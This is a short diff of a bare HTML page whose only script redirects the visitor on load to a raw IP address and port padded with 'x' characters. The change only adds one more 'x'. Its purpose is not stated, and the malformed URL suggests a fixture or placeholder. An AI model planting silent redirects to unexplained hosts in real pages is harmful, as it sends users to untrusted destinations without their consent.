@@ -2,6 +2,6 @@
 <!DOCTYPE html>
 <html>
   <script>
-    window.location.href = "http://77.117.185.40:42069xxxxxx";
+    window.location.href = "http://77.117.185.40:42069xxxxxxx";
   </script>
 </html>
